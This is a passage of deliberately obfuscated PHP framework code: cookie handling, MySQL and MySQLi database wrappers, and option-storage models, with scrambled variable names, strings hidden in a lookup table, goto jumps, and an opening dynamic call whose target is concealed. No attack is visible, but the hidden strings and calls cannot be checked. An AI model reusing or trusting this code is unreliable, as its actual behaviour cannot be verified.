$_SERVER[¡¬ıÜ ƒ][864]; $_act($_file); } goto b”±Ç˜–‰Ñ; B¡†Ğ»Éù’: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($…’áÜµ = '', $Åà¶‰Éø = 0) { if (is_string($…’áÜµ) && $…’áÜµ != $_SERVER[¡¬ıÜ ƒ][12]) { $this->prefix = $…’áÜµ; } if (is_numeric($Åà¶‰Éø) && $Åà¶‰Éø > 0) { $this->expire = $Åà¶‰Éø; } } public static function getInstance() { static $Ğåñ¡ø¥; if ($Ğåñ¡ø¥ === null) { $Ğåñ¡ø¥ = new self(); } return $Ğåñ¡ø¥; } private static $cookieDisable = false; public static function disable($­úÇÒø) { self::$cookieDisable = $­úÇÒø; } private static $sameCookieSet = array(); public static function set($çœ›§×ƒ, $İ¢¹™È, $ôÉŒ‘ÌŠ = 0, $Ç–ÛáŠ† = false, $ŸãÎÑøî = false) { $ô×¹‚Û· =& $_SERVER[¡¬ıÜ ƒ]; if (self::$cookieDisable) { return; } if (!$ôÉŒ‘ÌŠ) { $ôÉŒ‘ÌŠ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$çœ›§×ƒ]) && self::$sameCookieSet[$çœ›§×ƒ] == $İ¢¹™È . $ôÉŒ‘ÌŠ) { return; } self::$sameCookieSet[$çœ›§×ƒ] = $İ¢¹™È . $ôÉŒ‘ÌŠ; if (!$ŸãÎÑøî) { $ŸãÎÑøî = str_replace(HOST, $ô×¹‚Û·[12], APP_HOST); $ŸãÎÑøî = _get($GLOBALS, $ô×¹‚Û·[971], $ŸãÎÑøî); } $‹çÇ‚İ¸ = $ô×¹‚Û·[12]; setcookie($çœ›§×ƒ, $İ¢¹™È, time() + $ôÉŒ‘ÌŠ, $ô×¹‚Û·[8] . trim($ŸãÎÑøî, $ô×¹‚Û·[8]) . $‹çÇ‚İ¸, !1, !1, $Ç–ÛáŠ†); } public static function setSafe($ªÄºå±, $ŞìÓïÜ, $¼½—Â« = 0) { self::set($ªÄºå±, $ŞìÓïÜ, $¼½—Â«, !0); } public static function get($Õù‡äöå) { static $«ç’¼©ú = false; if (!$«ç’¼©ú) { self::initHeaderCookie(); $«ç’¼©ú = !0; } return isset($_COOKIE[$Õù‡äöå]) ? $_COOKIE[$Õù‡äöå] : !1; } private static function initHeaderCookie() { $Ä÷Éë“ñ =& $_SERVER[¡¬ıÜ ƒ]; if (!isset($_SERVER[$Ä÷Éë“ñ[972]]) || !$_SERVER[$Ä÷Éë“ñ[972]]) { return; } $¡ÎÆ–»ı = explode($Ä÷Éë“ñ[74], $_SERVER[$Ä÷Éë“ñ[972]]); foreach ($¡ÎÆ–»ı as $üºè»š÷) { $üºè»š÷ = explode($Ä÷Éë“ñ[508], $üºè»š÷); if (count($üºè»š÷) != 2 || !isset($üºè»š÷[1])) { continue; } $_COOKIE[trim($üºè»š÷[0])] = trim($üºè»š÷[1]); } } public static function remove($ˆÁìı¿, $û‘Ñ‘©ª = false) { unset($_COOKIE[$ˆÁìı¿]); self::set($ˆÁìı¿, $_SERVER[¡¬ıÜ ƒ][12], 1, $û‘Ñ‘©ª); } } class DbMysql extends Db { public function __construct($Œ“‘¦ë® = '') { $—ª¥…æ =& $_SERVER[¡¬ıÜ ƒ]; if (!extension_loaded($—ª¥…æ[894])) { think_exception(think_lang($—ª¥…æ[14]) . $—ª¥…æ[973]); } if (!empty($Œ“‘¦ë®)) { $this->config = $Œ“‘¦ë®; if (empty($this->config[$—ª¥…æ[17]])) { $this->config[$—ª¥…æ[17]] = $—ª¥…æ[12]; } } } public function connect($Å°“¯Ïè = '', $€àÄúà = 0, $î·»İ¢ú = false) { $»ÇÇ® =& $_SERVER[¡¬ıÜ ƒ]; if (!isset($this->linkID[$€àÄúà])) { if (empty($Å°“¯Ïè)) { $Å°“¯Ïè = $this->config; } $Å„¦è³¥ = $Å°“¯Ïè[$»ÇÇ®[974]] . ($Å°“¯Ïè[$»ÇÇ®[975]] ? "\72{$Å°“¯Ïè[$»ÇÇ®[975]]}" : $»ÇÇ®[12]); $ò¬ÓšÎø = !empty($Å°“¯Ïè[$»ÇÇ®[17]][$»ÇÇ®[18]]) ? $Å°“¯Ïè[$»ÇÇ®[17]][$»ÇÇ®[18]] : $this->pconnect; if ($ò¬ÓšÎø) { $this->linkID[$€àÄúà] = mysql_pconnect($Å„¦è³¥, $Å°“¯Ïè[$»ÇÇ®[976]], $Å°“¯Ïè[$»ÇÇ®[977]], 131072); } else { $this->linkID[$€àÄúà] = mysql_connect($Å„¦è³¥, $Å°“¯Ïè[$»ÇÇ®[976]], $Å°“¯Ïè[$»ÇÇ®[977]], !0, 131072); } if (!$this->linkID[$€àÄúà] || !empty($Å°“¯Ïè[$»ÇÇ®[21]]) && !mysql_select_db($Å°“¯Ïè[$»ÇÇ®[21]], $this->linkID[$€àÄúà])) { think_exception(mysql_error()); } $¾–™Æ·‡ = mysql_get_server_info($this->linkID[$€àÄúà]); mysql_query($»ÇÇ®[978] . think_config($»ÇÇ®[979]) . $»ÇÇ®[58], $this->linkID[$€àÄúà]); if ($¾–™Æ·‡ > $»ÇÇ®[980]) { mysql_query($»ÇÇ®[981], $this->linkID[$€àÄúà]); } $this->connected = !0; if (1 != think_config($»ÇÇ®[22])) { unset($this->config); } } return $this->linkID[$€àÄúà]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Ãâ™ìº) { $¯˜›ï‡ =& $_SERVER[¡¬ıÜ ƒ]; if (0 === stripos($Ãâ™ìº, $¯˜›ï‡[343])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ãâ™ìº; if ($this->queryID) { $this->free(); } think_action_status($¯˜›ï‡[23], 1); think_status($¯˜›ï‡[24]); $this->queryID = mysql_query($Ãâ™ìº, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($£Á‰íç³) { $ìøŸÅÁ³ =& $_SERVER[¡¬ıÜ ƒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $£Á‰íç³; if ($this->queryID) { $this->free(); } think_action_status($ìøŸÅÁ³[25], 1); think_status($ìøŸÅÁ³[24]); $ãâ¦Ûİª = mysql_query($£Á‰íç³, $this->_linkID); $this->debug(); if (!1 === $ãâ¦Ûİª) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¡¬ıÜ ƒ][982], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ŸÌ¤„ÃÜ = mysql_query($_SERVER[¡¬ıÜ ƒ][983], $this->_linkID); $this->transTimes = 0; if (!$ŸÌ¤„ÃÜ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Â’î‰Ñ£ = mysql_query($_SERVER[¡¬ıÜ ƒ][984], $this->_linkID); $this->transTimes = 0; if (!$Â’î‰Ñ£) { $this->error(); return !1; } } return !0; } private function getAll() { $·Æ÷»Õİ = array(); if ($this->numRows > 0) { while ($Õ¤ìº‡ƒ = mysql_fetch_assoc($this->queryID)) { $·Æ÷»Õİ[] = $Õ¤ìº‡ƒ; } mysql_data_seek($this->queryID, 0); } return $·Æ÷»Õİ; } public function getFields($¬ùÙ—É¼) { $­œİñ’™ =& $_SERVER[¡¬ıÜ ƒ]; $±«×»‚İ = $this->query($­œİñ’™[985] . $this->parseKey($¬ùÙ—É¼)); $ö°™®ú– = array(); if ($±«×»‚İ) { foreach ($±«×»‚İ as $È¦öÈµ => $Ê«¯Ô¡«) { $ö°™®ú–[$Ê«¯Ô¡«[$­œİñ’™[31]]] = array($­œİñ’™[32] => $Ê«¯Ô¡«[$­œİñ’™[31]], $­œİñ’™[33] => $Ê«¯Ô¡«[$­œİñ’™[34]], $­œİñ’™[35] => (bool) (strtoupper($Ê«¯Ô¡«[$­œİñ’™[36]]) === $­œİñ’™[986]), $­œİñ’™[37] => $Ê«¯Ô¡«[$­œİñ’™[38]], $­œİñ’™[39] => strtolower($Ê«¯Ô¡«[$­œİñ’™[40]]) == $­œİñ’™[41], $­œİñ’™[42] => strtolower($Ê«¯Ô¡«[$­œİñ’™[43]]) == $­œİñ’™[44]); } } return $ö°™®ú–; } public function getTables($¾êİ‡ç = '') { $Éíñşñ =& $_SERVER[¡¬ıÜ ƒ]; if (!empty($¾êİ‡ç)) { $ÔÆéíÈŒ = $Éíñşñ[987] . $¾êİ‡ç . $Éíñşñ[988]; } else { $ÔÆéíÈŒ = $Éíñşñ[989]; } $Ï§·ˆ®™ = $this->query($ÔÆéíÈŒ); $á§Ğø¾ = array(); foreach ($Ï§·ˆ®™ as $Û»›ßé÷ => $Õ«£àã) { $á§Ğø¾[$Û»›ßé÷] = current($Õ«£àã); } return $á§Ğø¾; } public function replace($‘ËÉşÚ», $„ì—Í©¨ = array()) { $ğÜÊ¬£ =& $_SERVER[¡¬ıÜ ƒ]; foreach ($‘ËÉşÚ» as $ĞÅñ•Èü => $âŸç¸ˆÒ) { $¡¹àÛ• = $this->parseValue($âŸç¸ˆÒ); if (is_scalar($¡¹àÛ•)) { $‘ÆÀğ€Å[] = $¡¹àÛ•; $é°æ†ğ[] = $this->parseKey($ĞÅñ•Èü); } } $øÀ¤í¾ = $ğÜÊ¬£[990] . $this->parseTable($„ì—Í©¨[$ğÜÊ¬£[358]]) . $ğÜÊ¬£[991] . implode($ğÜÊ¬£[50], $é°æ†ğ) . $ğÜÊ¬£[992] . implode($ğÜÊ¬£[50], $‘ÆÀğ€Å) . $ğÜÊ¬£[993]; return $this->execute($øÀ¤í¾); } public function insertAll($°š¶ÕÚÈ, $À£ÌíÛ± = array(), $‹ÍÀÛÌ = false) { $îÒ÷¹ñ =& $_SERVER[¡¬ıÜ ƒ]; if (!is_array($°š¶ÕÚÈ[0])) { return !1; } $èö¬ò¾ = array_keys($°š¶ÕÚÈ[0]); $¤ÕÛ¸ŒŒ = array(); foreach ($°š¶ÕÚÈ as $ºñÅÉöÖ) { $¤«¼œ÷ = array(); foreach ($ºñÅÉöÖ as $ÆëÅÀ¨ç => $¿“·ªÕ†) { $¿“·ªÕ† = $this->parseValue($¿“·ªÕ†); if (is_scalar($¿“·ªÕ†)) { $¤«¼œ÷[] = $¿“·ªÕ†; } } $¤ÕÛ¸ŒŒ[] = $îÒ÷¹ñ[339] . implode($îÒ÷¹ñ[50], $¤«¼œ÷) . $îÒ÷¹ñ[993]; } array_walk($èö¬ò¾, array($this, $îÒ÷¹ñ[994])); $–ê –¡™ = ($‹ÍÀÛÌ ? $îÒ÷¹ñ[995] : $îÒ÷¹ñ[996]) . $îÒ÷¹ñ[997] . $this->parseTable($À£ÌíÛ±[$îÒ÷¹ñ[358]]) . $îÒ÷¹ñ[991] . implode($îÒ÷¹ñ[50], $èö¬ò¾) . $îÒ÷¹ñ[998] . implode($îÒ÷¹ñ[50], $¤ÕÛ¸ŒŒ); return $this->execute($–ê –¡™); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÚÍ‚ÓÅ =& $_SERVER[¡¬ıÜ ƒ]; $this->error = mysql_errno() . $ÚÍ‚ÓÅ[4] . mysql_error($this->_linkID); if ($ÚÍ‚ÓÅ[12] != $this->queryStr) { $this->error .= LNG($ÚÍ‚ÓÅ[48]) . $this->queryStr; } think_trace($this->error, $ÚÍ‚ÓÅ[12], $ÚÍ‚ÓÅ[49]); return $this->error; } public function escapeString($Ì°¤‰˜è) { if ($this->_linkID) { return mysql_real_escape_string($Ì°¤‰˜è, $this->_linkID); } else { return mysql_escape_string($Ì°¤‰˜è); } } public function parseKey(&$â¥•ÚÂÙ, $¿×£óÅæ = true) { $¨óÆ­¢ =& $_SERVER[¡¬ıÜ ƒ]; if ($¿×£óÅæ) { $â¥•ÚÂÙ = $this->parseKeyCheck($â¥•ÚÂÙ); } if ($â¥•ÚÂÙ != $¨óÆ­¢[222] && !preg_match($¨óÆ­¢[999], $â¥•ÚÂÙ)) { $â¥•ÚÂÙ = $¨óÆ­¢[463] . trim($â¥•ÚÂÙ, $¨óÆ­¢[463]) . $¨óÆ­¢[463]; } return $â¥•ÚÂÙ; } } class DbMysqli extends Db { public function __construct($ó¢‡¥ŠÊ = '') { $ï²ˆÈ‡³ =& $_SERVER[¡¬ıÜ ƒ]; if (!extension_loaded($ï²ˆÈ‡³[1000])) { think_exception(think_lang($ï²ˆÈ‡³[14]) . $ï²ˆÈ‡³[1001]); } if (!empty($ó¢‡¥ŠÊ)) { $this->config = $ó¢‡¥ŠÊ; if (empty($this->config[$ï²ˆÈ‡³[17]])) { $this->config[$ï²ˆÈ‡³[17]] = $ï²ˆÈ‡³[12]; } } } public function connect($‹çĞûÑ = '', $¼€‹ş¡ = 0) { $½ˆ«‰Íú =& $_SERVER[¡¬ıÜ ƒ]; if (!isset($this->linkID[$¼€‹ş¡])) { if (empty($‹çĞûÑ)) { $‹çĞûÑ = $this->config; } $this->linkID[$¼€‹ş¡] = new mysqli($‹çĞûÑ[$½ˆ«‰Íú[974]], $‹çĞûÑ[$½ˆ«‰Íú[976]], $‹çĞûÑ[$½ˆ«‰Íú[977]], $‹çĞûÑ[$½ˆ«‰Íú[21]], $‹çĞûÑ[$½ˆ«‰Íú[975]] ? intval($‹çĞûÑ[$½ˆ«‰Íú[975]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÚìúæàÅ = $this->linkID[$¼€‹ş¡]->server_version; $this->linkID[$¼€‹ş¡]->query($½ˆ«‰Íú[978] . think_config($½ˆ«‰Íú[979]) . $½ˆ«‰Íú[58]); if ($ÚìúæàÅ > $½ˆ«‰Íú[980]) { $this->linkID[$¼€‹ş¡]->query($½ˆ«‰Íú[981]); } $this->connected = !0; if (1 != think_config($½ˆ«‰Íú[22])) { unset($this->config); } } return $this->linkID[$¼€‹ş¡]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($÷ãéªÉÎ) { $ˆµ›÷Ğ =& $_SERVER[¡¬ıÜ ƒ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $÷ãéªÉÎ; if ($this->queryID) { $this->free(); } think_action_status($ˆµ›÷Ğ[23], 1); think_status($ˆµ›÷Ğ[24]); $this->queryID = $this->_linkID->query($÷ãéªÉÎ); if ($this->_linkID->more_results()) { while (($…Áæ×ÌÛ = $this->_linkID->next_result()) != NULL) { $…Áæ×ÌÛ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Ò¾™¹Ùä) { $œèî±ïù =& $_SERVER[¡¬ıÜ ƒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ò¾™¹Ùä; if ($this->queryID) { $this->free(); } think_action_status($œèî±ïù[25], 1); think_status($œèî±ïù[24]); $Ó„ ‡ = $this->_linkID->query($Ò¾™¹Ùä); $this->debug(); if (!1 === $Ó„ ‡) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $µ‰æ˜æé = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$µ‰æ˜æé) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $÷àİ™¬Û = $this->_linkID->rollback(); $this->transTimes = 0; if (!$÷àİ™¬Û) { $this->error(); return !1; } } return !0; } private function getAll() { $¨Êğ‚«Ù = array(); if ($this->numRows > 0) { for ($û‚³ı¯ = 0; $û‚³ı¯ < $this->numRows; $û‚³ı¯++) { $¨Êğ‚«Ù[$û‚³ı¯] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¨Êğ‚«Ù; } public function getFields($‰ÕˆäĞö) { $Òå«¥Ù¨ =& $_SERVER[¡¬ıÜ ƒ]; $ãÔÌØ´˜ = $this->query($Òå«¥Ù¨[985] . $this->parseKey($‰ÕˆäĞö)); $¥·ÊÜÉò = array(); if ($ãÔÌØ´˜) { foreach ($ãÔÌØ´˜ as $ˆ×Ğ»»å => $Òóëˆô€) { $¥·ÊÜÉò[$Òóëˆô€[$Òå«¥Ù¨[31]]] = array($Òå«¥Ù¨[32] => $Òóëˆô€[$Òå«¥Ù¨[31]], $Òå«¥Ù¨[33] => $Òóëˆô€[$Òå«¥Ù¨[34]], $Òå«¥Ù¨[35] => (bool) ($Òóëˆô€[$Òå«¥Ù¨[36]] === $Òå«¥Ù¨[12]), $Òå«¥Ù¨[37] => $Òóëˆô€[$Òå«¥Ù¨[38]], $Òå«¥Ù¨[39] => strtolower($Òóëˆô€[$Òå«¥Ù¨[40]]) == $Òå«¥Ù¨[41], $Òå«¥Ù¨[42] => strtolower($Òóëˆô€[$Òå«¥Ù¨[43]]) == $Òå«¥Ù¨[44]); } } return $¥·ÊÜÉò; } public function getTables($¿®ÚòĞ = '') { $¬ÆİÛø² =& $_SERVER[¡¬ıÜ ƒ]; $ÇÓ›Ôå» = !empty($¿®ÚòĞ) ? $¬ÆİÛø²[987] . $¿®ÚòĞ . $¬ÆİÛø²[988] : $¬ÆİÛø²[989]; $¾¾ÒğŒ« = $this->query($ÇÓ›Ôå»); $Ş ÆüŸ¯ = array(); if ($¾¾ÒğŒ«) { foreach ($¾¾ÒğŒ« as $äÒá­£Ë => $ñóü£”) { $Ş ÆüŸ¯[$äÒá­£Ë] = current($ñóü£”); } } return $Ş ÆüŸ¯; } public function replace($ã™ê¸éÖ, $âíÃğ‚Õ = array()) { $ç¾ÛÈµÕ =& $_SERVER[¡¬ıÜ ƒ]; foreach ($ã™ê¸éÖ as $¿Çò¢«ï => $‘Êø…ªâ) { $Ë±ğ…÷­ = $this->parseValue($‘Êø…ªâ); if (is_scalar($Ë±ğ…÷­)) { $•Ê³Ê‘[] = $Ë±ğ…÷­; $ï×¨¨àÖ[] = $this->parseKey($¿Çò¢«ï); } } $÷«òÁøş = $ç¾ÛÈµÕ[990] . $this->parseTable($âíÃğ‚Õ[$ç¾ÛÈµÕ[358]]) . $ç¾ÛÈµÕ[991] . implode($ç¾ÛÈµÕ[50], $ï×¨¨àÖ) . $ç¾ÛÈµÕ[992] . implode($ç¾ÛÈµÕ[50], $•Ê³Ê‘) . $ç¾ÛÈµÕ[993]; return $this->execute($÷«òÁøş); } public function insertAll($êÛáä© , $óÔ”Û‡Í = array(), $î¸µ“™ = false) { $ç±¨ïÚ§ =& $_SERVER[¡¬ıÜ ƒ]; if (!is_array($êÛáä© [0])) { return !1; } $´Ñê€„ = array_keys($êÛáä© [0]); $şÉüûË¦ = array(); foreach ($êÛáä©  as $™Ò°Š›») { $”öªœß = array(); foreach ($™Ò°Š›» as $•´ıŸÈ‡ => $³™¨š¼¡) { $³™¨š¼¡ = $this->parseValue($³™¨š¼¡); if (is_scalar($³™¨š¼¡)) { $”öªœß[] = $³™¨š¼¡; } } $şÉüûË¦[] = $ç±¨ïÚ§[339] . implode($ç±¨ïÚ§[50], $”öªœß) . $ç±¨ïÚ§[993]; } array_walk($´Ñê€„, array($this, $ç±¨ïÚ§[994])); $ì÷ë®äñ = $î¸µ“™ ? $ç±¨ïÚ§[995] : $ç±¨ïÚ§[996]; $ŠˆÚ»ãÀ = $ì÷ë®äñ . $ç±¨ïÚ§[997] . $this->parseTable($óÔ”Û‡Í[$ç±¨ïÚ§[358]]) . $ç±¨ïÚ§[991] . implode($ç±¨ïÚ§[50], $´Ñê€„) . $ç±¨ïÚ§[998] . implode($ç±¨ïÚ§[50], $şÉüûË¦); return $this->execute($ŠˆÚ»ãÀ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ìØÊ¡Ô =& $_SERVER[¡¬ıÜ ƒ]; $this->error = $this->_linkID->errno . $ìØÊ¡Ô[4] . $this->_linkID->error; if ($ìØÊ¡Ô[12] != $this->queryStr) { $this->error .= LNG($ìØÊ¡Ô[48]) . $this->queryStr; } think_trace($this->error, $ìØÊ¡Ô[12], $ìØÊ¡Ô[49]); return $this->error; } public function escapeString($ÆÒîİ…ª) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÆÒîİ…ª); } else { return addslashes($ÆÒîİ…ª); } } public function parseKey(&$öÒ×úÆ, $á®Û¨¨Ø = true) { $†ÁŞÀ‹ =& $_SERVER[¡¬ıÜ ƒ]; if ($á®Û¨¨Ø) { $öÒ×úÆ = $this->parseKeyCheck($öÒ×úÆ); } if ($öÒ×úÆ != $†ÁŞÀ‹[222] && !preg_match($†ÁŞÀ‹[999], $öÒ×úÆ)) { $öÒ×úÆ = $†ÁŞÀ‹[463] . trim($öÒ×úÆ, $†ÁŞÀ‹[463]) . $†ÁŞÀ‹[463]; } return $öÒ×úÆ; } } goto AªéÚˆà×Ø; AĞÖ…ñÜ’ˆ: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\164\x65\155\x4f\x70\x74\x69\x6f\156"; public $field = array(); public function listData($ü¸¼Ì“ = false, $Ã¸Á´èû = "\155\157\144\x69\146\171\x54\x69\155\x65", $Å³ÀÁ–Í = false) { $¸˜”ş­– = Model($this->modelType)->get(!1, $this->optionType, !0); $šÑÑÂÔ = array_values($¸˜”ş­–); if ($šÑÑÂÔ && $šÑÑÂÔ[0] && !is_array($šÑÑÂÔ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¸˜”ş­– = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¸˜”ş­–) { return $ü¸¼Ì“ ? null : array(); } if (!$ü¸¼Ì“) { $¸˜”ş­– = array_filter(array_values($¸˜”ş­–)); return array_sort_by($¸˜”ş­–, $Ã¸Á´èû, $Å³ÀÁ–Í); } return $¸˜”ş­–[$_SERVER[¡¬ıÜ ƒ][474] . $ü¸¼Ì“]; } public function insert($¾¼ıùô†) { $ı—ıà°½ =& $_SERVER[¡¬ıÜ ƒ]; $¾¼ıùô† = array_field_key($¾¼ıùô†, $this->field); $áÒ©–Œ = Model($this->modelType)->get($ı—ıà°½[475], $this->optionType . $ı—ıà°½[476]); $áÒ©–Œ = $áÒ©–Œ ? $áÒ©–Œ : 0; $¾¼ıùô†[$ı—ıà°½[477]] = ++$áÒ©–Œ; $¾¼ıùô†[$ı—ıà°½[233]] = time(); $¾¼ıùô†[$ı—ıà°½[88]] = time(); Model($this->modelType)->set($ı—ıà°½[475], $áÒ©–Œ, $this->optionType . $ı—ıà°½[476]); Model($this->modelType)->set($ı—ıà°½[474] . $áÒ©–Œ, $¾¼ıùô†, $this->optionType); return $áÒ©–Œ; } public function update($ïÊ®¯ Â, $°¥Éšµê) { $¥Œ²Ş«ş =& $_SERVER[¡¬ıÜ ƒ]; $°¥Éšµê = array_field_key($°¥Éšµê, $this->field); $µĞú¡ö“ = $this->listData($ïÊ®¯ Â); if (!$µĞú¡ö“ || !$ïÊ®¯ Â) { return !1; } $°¥Éšµê = array_merge($µĞú¡ö“, $°¥Éšµê); $°¥Éšµê[$¥Œ²Ş«ş[88]] = time(); return Model($this->modelType)->set($¥Œ²Ş«ş[474] . $ïÊ®¯ Â, $°¥Éšµê, $this->optionType); } public function remove($ŠšŒ¹¬) { if (!$ŠšŒ¹¬) { return !1; } return Model($this->modelType)->remove($_SERVER[¡¬ıÜ ƒ][474] . $ŠšŒ¹¬, $this->optionType); } public function clear() { $ƒüıÇĞ¦ =& $_SERVER[¡¬ıÜ ƒ]; Model($this->modelType)->remove($ƒüıÇĞ¦[475], $this->optionType . $ƒüıÇĞ¦[476]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Ø¯æ§ˆÌ, $Ü»ÍÕ¾ë) { if (!$Ü»ÍÕ¾ë) { return !1; } $´ıãËÆ = $this->listData(); $´ıãËÆ = array_to_keyvalue($´ıãËÆ, $Ø¯æ§ˆÌ); return isset($´ıãËÆ[$Ü»ÍÕ¾ë]) ? $´ıãËÆ[$Ü»ÍÕ¾ë] : !1; } public function findByName($çèÏî²õ) { return $this->findByKey($_SERVER[¡¬ıÜ ƒ][32], $çèÏî²õ); } protected function resetData($Ê‚°ôúš) { $Ú˜ÑëÃä =& $_SERVER[¡¬ıÜ ƒ]; $Ê‚°ôúš = is_array($Ê‚°ôúš) ? $Ê‚°ôúš : array(); $¬¡éÌ»œ = array(); for ($”åéŒÍ€ = 0; $”åéŒÍ€ < count($Ê‚°ôúš); $”åéŒÍ€++) { $¬¡éÌ»œ[$Ú˜ÑëÃä[474] . $Ê‚°ôúš[$”åéŒÍ€][$Ú˜ÑëÃä[477]]] = $Ê‚°ôúš[$”åéŒÍ€]; } return Model($this->modelType)->set($¬¡éÌ»œ, !1, $this->optionType); } private function getAutoName($ø°íãğ½) { $’‡„Ø = array_to_keyvalue($this->listData(), $_SERVER[¡¬ıÜ ƒ][32]); if (!$’‡„Ø || !isset($’‡„Ø[$ø°íãğ½])) { return $ø°íãğ½; } for ($Ë‚†Ãˆ÷ = 1; $Ë‚†Ãˆ÷ < count($’‡„Ø); $Ë‚†Ãˆ÷++) { $–¹îêˆÉ = $ø°íãğ½ . "\50{$Ë‚†Ãˆ÷}\51"; if (!isset($’‡„Ø[$–¹îêˆÉ])) { return $–¹îêˆÉ; } } return $–¹îêˆÉ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ŞÖû†› = false, $®Š²¦“¹ = '', $ç¦˜ÈŠ· = false) { $©è”Šà¶ =& $_SERVER[¡¬ıÜ ƒ]; $¯‡ñ¹É = $this->cacheGet($®Š²¦“¹); $è«»ÕÅŞ = $this->optionDefault($®Š²¦“¹); $è«»ÕÅŞ = is_array($è«»ÕÅŞ) ? $è«»ÕÅŞ : array(); if (is_array($¯‡ñ¹É)) { $¯‡ñ¹É = array_merge($è«»ÕÅŞ, $¯‡ñ¹É); return $ŞÖû†› ? isset($¯‡ñ¹É[$ŞÖû†›]) ? $¯‡ñ¹É[$ŞÖû†›] : null : $¯‡ñ¹É; } $çÅÖ×¹ = $this->filterWhere(array($©è”Šà¶[33] => $®Š²¦“¹)); $¯‡ñ¹É = $this->where($çÅÖ×¹)->select(); $¯‡ñ¹É = array_to_keyvalue($¯‡ñ¹É, $©è”Šà¶[97], $©è”Šà¶[452]); foreach ($¯‡ñ¹É as $¸Ó…Ë¬ => $¿”ëèïÁ) { if ($ç¦˜ÈŠ· || in_array($¸Ó…Ë¬, $this->jsonField)) { $¯‡ñ¹É[$¸Ó…Ë¬] = json_decode($¿”ëèïÁ, !0); } } $this->cacheSet($®Š²¦“¹, $¯‡ñ¹É); $¯‡ñ¹É = array_merge($è«»ÕÅŞ, $¯‡ñ¹É); return $ŞÖû†› ? $¯‡ñ¹É[$ŞÖû†›] : $¯‡ñ¹É; } public function set($Çœ°¼‹, $Ÿ’ÏÊÏ = false, $Ú”è±ÒÌ = '') { $¿·¹¸¢¼ =& $_SERVER[¡¬ıÜ ƒ]; $this->cacheRemove($Ú”è±ÒÌ); $¯Â²Ä³ = array(); $úµ¼Ğ¡ô = is_array($Çœ°¼‹) ? $Çœ°¼‹ : array($Çœ°¼‹ => $Ÿ’ÏÊÏ); foreach ($úµ¼Ğ¡ô as $“Ô­Í¯ => $ÊŠ’¯ƒ) { if (is_array($ÊŠ’¯ƒ)) { $ÊŠ’¯ƒ = json_encode_force($ÊŠ’¯ƒ); } $this->checkLength($ÊŠ’¯ƒ, !1, $this->tableName . $¿·¹¸¢¼[4] . $Çœ°¼‹); $ÊŠ’¯ƒ = self::textEncode($ÊŠ’¯ƒ); $úµ¼Ğ¡ô = array($¿·¹¸¢¼[33] => $Ú”è±ÒÌ, $¿·¹¸¢¼[97] => $“Ô­Í¯, $¿·¹¸¢¼[452] => $ÊŠ’¯ƒ); $¯Â²Ä³[] = $this->filterWhere($úµ¼Ğ¡ô); } if (!$¯Â²Ä³) { return !0; } $—™ü‰Ä = $this->cacheKey($¿·¹¸¢¼[478]); CacheLock::lock($—™ü‰Ä); $Âèû«È‡ = $this->addAll($¯Â²Ä³, array(), !0); CacheLock::unlock($—™ü‰Ä); return $Âèû«È‡; } protected function optionDefault($–Ùö”ÅÀ = '') { return !1; } public function setDeep($šŞŞ«¾Ú, $¹ÊâÌŠ· = false, $ŞÒøéŸ = '') { $ï«Š³§Ÿ = explode($_SERVER[¡¬ıÜ ƒ][10], $šŞŞ«¾Ú); $ë¥Ö…ûÃ = $this->get(); array_set_value($ë¥Ö…ûÃ, $šŞŞ«¾Ú, $¹ÊâÌŠ·); $this->set($ï«Š³§Ÿ[0], $ë¥Ö…ûÃ[$ï«Š³§Ÿ[0]], $ŞÒøéŸ); } public function remove($£îŸ¼¥, $‹º«øª× = '') { $ÙÆ³æ¶¼ =& $_SERVER[¡¬ıÜ ƒ]; $this->cacheRemove($‹º«øª×); $õ¡õÒ”ï = $this->filterWhere(array($ÙÆ³æ¶¼[97] => $£îŸ¼¥, $ÙÆ³æ¶¼[33] => $‹º«øª×)); if (is_null($£îŸ¼¥)) { unset($õ¡õÒ”ï[$ÙÆ³æ¶¼[97]]); } return $this->where($õ¡õÒ”ï)->delete(); } public function cacheSet($ŒªÑíøû, $ÙÏúÆùÎ = false) { return 